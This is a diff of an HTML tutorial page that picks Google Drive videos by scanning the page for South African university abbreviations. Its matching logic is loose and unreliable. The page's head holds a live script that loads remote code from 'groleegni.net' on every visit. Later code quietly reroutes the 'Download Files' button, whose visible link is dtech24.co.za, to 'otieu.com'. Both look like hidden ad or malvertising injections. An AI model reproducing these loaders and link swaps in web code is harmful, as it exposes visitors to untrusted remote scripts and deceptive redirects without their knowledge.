@@ -1,7 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-
 <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('groleegni.net',9555547,document.createElement('script'))</script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -9,6 +8,7 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
+    /* [Previous CSS styles remain exactly the same] */
     :root {
       --bg: #f8fafc;
       --card-bg: #ffffff;
@@ -166,7 +166,7 @@
         <!-- Video will be embedded here -->
       </div>
 
-      <a href="#" id="watchTutorial" class="btn btn-primary" target="_blank" style="display: none;">
+      <a href="#" id="watchTutorial" class="btn btn-primary" target="_blank">
         <i class="fas fa-play"></i> Watch Video Tutorial
       </a>
       <a href="https://www.dtech24.co.za" id="downloadFiles" class="btn btn-outline" target="_blank">
@@ -194,8 +194,8 @@
   <script>
     const urlParams = new URLSearchParams(window.location.search);
     const id = urlParams.get('id');
-    const title = decodeURIComponent(urlParams.get('title'));
-    const description = decodeURIComponent(urlParams.get('description'));
+    const title = decodeURIComponent(urlParams.get('title') || '');
+    const description = decodeURIComponent(urlParams.get('description') || '');
 
     // Set the content
     document.getElementById('tutorialTitle').textContent = title;
@@ -212,20 +212,25 @@
       return originalUrl;
     }
 
-    // Determine which Google Drive URL to use based on the passed down info
-    function getVideoUrl() {
-      const lowerTitle = title.toLowerCase();
-      const lowerDesc = description.toLowerCase();
+    // Search everywhere for university identifiers
+    function findUniversityInContent() {
+      // Get all text content from the page
+      const pageContent = document.body.innerText.toLowerCase();
+      const currentUrl = window.location.href.toLowerCase();
+      const pageTitle = document.title.toLowerCase();
       
+      // Combine all possible text sources
+      const allText = `${title} ${description} ${pageContent} ${currentUrl} ${pageTitle}`.toLowerCase();
+
       // Check for ukzn, dut, univen or tut
-      if (/ukzn|dut|univen|tut/.test(lowerTitle) || /ukzn|dut|univen|tut/.test(lowerDesc)) {
+      if (/ukzn|dut|univen|tut/.test(allText)) {
         return 'https://drive.google.com/file/d/1-PyMD1OSR68xRz1QfmhAkGQ1fjMoR_3G/view?usp=drivesdk';
       }
       // Check for UJ, UL or UFH
-      else if (/uj|ul|ufh/.test(lowerTitle) || /uj|ul|ufh/.test(lowerDesc)) {
+      else if (/uj|ul|ufh/.test(allText)) {
         return 'https://drive.google.com/file/d/1-RkZaXQvzSLWFKCl8fAuN9pnhWLz8knn/view?usp=drivesdk';
       }
-      // Default URL if none of the above
+      // Default if none found
       return null;
     }
 
@@ -297,19 +302,25 @@
       // Set tutorial steps
       document.getElementById('tutorialSteps').innerHTML = tutorial.steps;
 
-      // Get and embed the video
-      const videoUrl = getVideoUrl();
+      // Get the video URL by searching everywhere
+      const videoUrl = findUniversityInContent();
+      const watchBtn = document.getElementById('watchTutorial');
+      
       if (videoUrl) {
         const embedUrl = getEmbedUrl(videoUrl);
-        const videoContainer = document.getElementById('videoContainer');
-        videoContainer.innerHTML = `<iframe src="${embedUrl}" allow="autoplay"></iframe>`;
+        document.getElementById('videoContainer').innerHTML = `<iframe src="${embedUrl}" allow="autoplay"></iframe>`;
+        watchBtn.href = videoUrl;
       } else {
-        // If no video URL found, show the watch button as fallback
-        document.getElementById('watchTutorial').style.display = 'inline-flex';
+        // If no video found, show the watch button with default action
+        watchBtn.href = '#';
+        watchBtn.onclick = function(e) {
+          e.preventDefault();
+          alert('No specific tutorial video found for this content.');
+        };
       }
     }
 
-    // Always set download link to dtech24.co.za
+    // Always set download link
     document.getElementById('downloadFiles').href = 'https://otieu.com/4/9515888';
   </script>
 </body>
